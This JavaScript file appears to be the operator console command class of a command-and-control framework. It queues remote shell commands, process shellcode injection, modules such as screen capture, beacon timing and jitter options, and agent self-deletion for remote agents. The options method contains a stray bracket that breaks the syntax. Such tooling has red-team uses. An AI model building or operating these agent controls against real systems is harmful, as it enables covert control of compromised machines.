import Vue from "vue";
import store from "@C2/store";

export default class commands {
  /* eslint-disable lines-between-class-members */
  #cmdShell = null;
  #switches = null;
  #modulesConfig = null;
  #debug = store.state.debug;
  $logging = Vue.prototype.$logging;
  /* eslint-enable lines-between-class-members */

  #usage = {
    shell: {
      help: `  Usage: shell <command>
  Will execute the command on the agent upon next checkin.`
    },

    module: {
      help: `  Usage: module <name>
  Send module for agent to execute
  Use 'module --list' to see a list of available modules & options`,
      list: ""
    },

    sc: {
      help: `  Usage: sc --pid <#> --shellcode <code>
  --pid       - process id# to inject
  --shellcode - hex encoded raw shellcode (make sure you know what you're doing)
    example: 00112233445566778899aabbccddeeff`
    },

    options: {
      help: `
  Usage: option <attribute> <value>
    Attribute [example]]
      --delay [seconds]           - time seconds between agent checkins
      --jitter [.01-.99]          - % change of delay
      --hours [5:00-19:00]        - Hours the agent will be "live" and checkin
      --eol [2099-12-31 23:59:59] - The date & time the agent will self terminate (experimental)`
    },

    kill: {
      help: `  Usage: kill
      Will kill the agent and delete the file`
    }
  };

  constructor(uuid) {
    this.uuid = uuid;
  }

  $setModulesConfig(config) {
    let commands = [];
    Object.keys(config).forEach(key => {
      commands.push(`  ${key} - ${config[key].Info} Example: '${config[key].Example}'`)
    });
    this.#usage.module.list = commands.join("\n");
    this.#modulesConfig = config;
  }

  $setCMDShell(x) {
    this.#cmdShell = x;
  }

  $getCMDShell() {
    return this.#cmdShell;
  }

  $setSwitches(x) {
    this.#switches = x;
  }

  $getSwitches() {
    return this.#switches;
  }

  $getCommands() {
    // trims out all class properties that are not commands
    const props = Object.getOwnPropertyNames(Object.getPrototypeOf(this));
    props.shift();
    const indexStart = props.findIndex(i => i[0] !== "$");
    return props.slice(indexStart, props.length);
  }

  help() {
    const commands = this.$getCommands();
    return "The list of available commands: \n" + commands.join("\n") +
      "\n\n Type `<command> --help` to get more info";
  }

  "?"() {
    return this.help();
  }

  shell(args) {
    const { _ } = args;
    this.$logging(["commands::shell:args=", args], this.#debug);
    let output = "";

    if (args.help) return this.#usage.shell.help;

    if (this.#cmdShell && this.#switches) {
      this.$logging(["commands::shell: _ =", _], this.#debug);
      _.shift();
      const command = _.join(" ");
      // const executable = `${this.#cmdShell} ${this.#switches} `;
      const job = [this.#cmdShell, this.#switches, command];
      const data = {
        name: this.uuid,
        action: "shell",
        options: job
      };
      output = store.dispatch("agents/sendJob", data);

      this.$logging(["commands::shell:data=", data], this.debug);
      this.$logging(["commands::shell:output=", output], this.debug);
      return output;
    }

    if (!this.#cmdShell) {
      output = "Error: command shell not set.";
    } else {
      output = "Error: command switches not set.";
    }
    return output;
  }

  module(args) {
    const { _ } = args;
    this.$logging(["commands::module:args = ", args], this.debug);

    if (args.help) return this.#usage.module.help;
    if (args.list) return this.#usage.module.list;

    _.shift(); // strips the 'module' element from the array
    try{
      const runType = _.shift();
      const moduleName = _.shift();
      const config = this.#modulesConfig[moduleName];

      if(! config) {
        return `Error: ${moduleName} is not valid. The valid module names are:\n${Object.keys(this.#modulesConfig).join("\n")}`
      }

      if(! config.RunType.includes(runType)) {
        return `Error: ${runType} is not valid. The valid run types are:\n${config.RunType.join("\n")}`
      }

      const data = {
        "AgentKey": this.uuid,
        "ModuleName": moduleName,
        "ModuleType": config.ModuleType,
        "Server": config.Server,
        "RunType": runType,
        "Arguments": _
      };

      return store.dispatch("agents/sendModule", data);
    } catch (e) {
      return `Error: ${e.message}`;
    }
  }

  sc(args) {
    this.$logging(["commands::sc:args=", args], this.#debug);
    if (args.help) return this.#usage.sc.help;
    let output = null;
    if (args.shellcode && args.pid) {
      const data = {
        name: this.uuid,
        action: "shellInject",
        options: [args.shellcode, args.pid]
      };
      output = store.dispatch("agents/sendJob", data);
    } else if (args.shellcode) {
      output = "ERROR: Missing --shellcode";
    } else {
      output = "ERROR: Missing --pid";
    }
    return output;
  }

  options(args) {
    this.$logging(["commands::options:args=", JSON.stringify(args)], this.#debug);
    if (args.help || args._.length === 1) return this.#usage.options.help;

    const optionsKeys = [
      "jitter", // % change of delay
      "delay", // in seconds
      "eol", // some date-time format
      "hours" // live hours like "5:00-19:00"
    ];

    let output = null;

    optionsKeys.forEach(key => {
      if (args[key] !== undefined) {
        try {
          const data = {
            name: this.uuid,
            action: "options",
            options: [key, args[key].toString()]
          };
          output = store.dispatch("agents/sendJob", data);
          this.$logging(["commands::options:data=", data], this.#debug);
          this.$logging(["commands::options:output=", output], this.#debug);
        } catch (error) {
          output = error;
        }
      }
    });

    return output;
    });
  }

  kill(args) {
    let output = null;
    const data = {
      name: this.uuid,
      action: "kill",
      options: null
    };
    output = store.dispatch("agents/sendJob", data);
    return output;
  }
}
/*
    help `
      Usage: shell <command>

      Will execute the command on the agent upon next checkin.
      `,
}
export default {
  help: {
    shell: {
      help: `
        Usage: shell <command>

        Will execute the command on the agent upon next checkin.
        `,
      validator() {
        return true;
      }
    },
    module: {
      help: `
        Usage: module <name>
        Send module for agent to execute
        Use 'module list' to see a list of available modules & options
        `,
      validator(args) {
        // make sure only 1 module is defined
        if (args._.length !== 1) return false;

        // make sure the module is in the module list
        const mod = args._[0];
        if (Object.keys(this.list).indexOf(mod) === -1) return false;

        return true;
      },
      list: {
        screengrab: "Take a screenshot of the agent's desktop"
      }
    },
    sc: {
      help: "shell code help text",
      validator() {
        // I think it'll need a validator to make sure input is hex
        return true;
      }
    },
    option: {
      help: `
      Usage: option <attribute> <value>
      Attribute [example]
      --delay [seconds]           - time seconds between agent checkins
      --jitter [.01-.99]          - % change of delay
      --hours [5:00-19:00]        - Hours the agent will be "live" and checkin
      --eol [2099-12-31 23:59:59] - The date & time the agent will self terminate (experimental)
      `,
      validator() {
        return true;
      }
    },
    download: {
      help: "Download File",
      validator() {
        return true;
      }
    }
  }
};
*/
